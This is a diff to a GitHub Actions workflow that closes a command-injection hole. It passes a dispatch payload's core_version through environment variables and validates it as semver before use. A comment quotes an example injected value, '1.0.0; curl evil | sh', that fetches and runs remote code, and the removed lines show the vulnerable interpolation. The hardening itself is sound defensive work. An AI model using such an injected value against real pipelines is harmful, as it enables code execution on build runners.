@@ -21,7 +21,19 @@ jobs:
         run: npm ci
 
       - name: Install specrails-core
-        run: npm install -g specrails-core@${{ github.event.client_payload.core_version }}
+        # M4: the repository_dispatch client_payload is attacker-influenced if the
+        # cross-repo dispatch token ever leaks. Pass it through an env var (never
+        # interpolated into the shell command) and validate it against a strict
+        # semver regex before use, so a value like "1.0.0; curl evil | sh" cannot
+        # achieve command execution on the runner.
+        env:
+          CORE_VERSION: ${{ github.event.client_payload.core_version }}
+        run: |
+          if ! printf '%s' "$CORE_VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "Refusing to install: invalid core_version '$CORE_VERSION'"
+            exit 1
+          fi
+          npm install -g "specrails-core@${CORE_VERSION}"
 
       - name: Run compat check
         run: npx tsx scripts/check-core-compat.ts
@@ -29,12 +41,18 @@ jobs:
       - name: Open issue on drift
         if: failure()
         uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
+        env:
+          CORE_VERSION: ${{ github.event.client_payload.core_version }}
         with:
+          # M4: read the payload from process.env (a JS string) instead of `${{ }}`
+          # interpolation, which would let a value with a quote break out of the
+          # script literal.
           script: |
-            github.rest.issues.create({
+            const coreVersion = process.env.CORE_VERSION || 'unknown'
+            await github.rest.issues.create({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              title: 'core-sync-required: specrails-core ${{ github.event.client_payload.core_version }} has breaking changes',
+              title: `core-sync-required: specrails-core ${coreVersion} has breaking changes`,
               body: 'The `sync-core-contract` workflow detected drift between specrails-core and specrails-hub.\n\nRun `npx tsx scripts/check-core-compat.ts` locally after installing the new core version to see the full diff.',
               labels: ['core-sync-required']
             })
